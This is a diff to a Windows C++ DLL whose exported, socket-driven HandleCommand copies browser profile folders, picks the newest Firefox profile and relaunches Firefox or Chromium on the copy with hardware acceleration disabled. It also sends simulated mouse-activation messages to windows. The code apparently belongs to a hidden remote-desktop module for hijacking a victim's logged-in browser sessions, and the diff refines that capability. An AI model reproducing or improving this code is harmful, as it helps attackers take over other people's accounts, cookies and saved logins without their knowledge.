@@ -973,6 +973,8 @@ static void activate_target_window(HWND hwnd, UINT msg, LRESULT ht) {
 
     g_hLastWindow = hRoot;
 
+    SendMessageW(hRoot, WM_MOUSEACTIVATE, (WPARAM)hRoot, MAKELPARAM(ht, msg));
+
     // Don't switch focus/foreground if clicking a menu or a window that already has its root active
     if (is_menu_or_popup(hwnd)) return;
 
@@ -995,7 +997,6 @@ static void activate_target_window(HWND hwnd, UINT msg, LRESULT ht) {
         }
     }
 
-    SendMessageW(hRoot, WM_MOUSEACTIVATE, (WPARAM)hRoot, MAKELPARAM(ht, msg));
 }
 
 // -----------------------------------------------------------------------
@@ -1349,7 +1350,7 @@ static bool copy_recursive(const fs::path& src, const fs::path& dst) {
             wstring name = path.filename().wstring();
 
             // Skip lock files
-            if (name == L"SingletonLock" || name == L"Parent.lock") continue;
+            if (name == L"SingletonLock" || name == L"Parent.lock" || name == L"parent.lock") continue;
 
             // Skip bulky directories
             if (entry.is_directory()) {
@@ -1495,13 +1496,16 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     WIN32_FIND_DATAW findData;
                     HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
                     if (hFind != INVALID_HANDLE_VALUE) {
+                        FILETIME latestTime = { 0, 0 };
                         do {
                             wstring name = findData.cFileName;
                             if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                                 if (wRequestedPath == L"Mozilla Firefox") {
                                     if (name.find(L".default") != wstring::npos) {
-                                        profileDir = name;
-                                        break;
+                                        if (CompareFileTime(&findData.ftLastWriteTime, &latestTime) > 0) {
+                                            latestTime = findData.ftLastWriteTime;
+                                            profileDir = name;
+                                        }
                                     }
                                 } else {
                                     if (name == L"Default" || name.find(L"Profile ") == 0) {
@@ -1520,6 +1524,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     if (wRequestedPath == L"Mozilla Firefox") {
                         SetEnvironmentVariableW(L"MOZ_DISABLE_HW_ACCEL", L"1");
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"0");
+                        SetEnvironmentVariableW(L"MOZ_DISABLE_GPU_PROCESS", L"1");
+                        SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HW_ACCEL", L"1");
                         args = L" -no-remote -profile \"" + profilePath + L"\\" + profileDir + L"\" --disable-gpu";
                     } else {
                         // Modern Chromium tarayıcılar için görünürlüğü ve kararlılığı artıran bayraklar
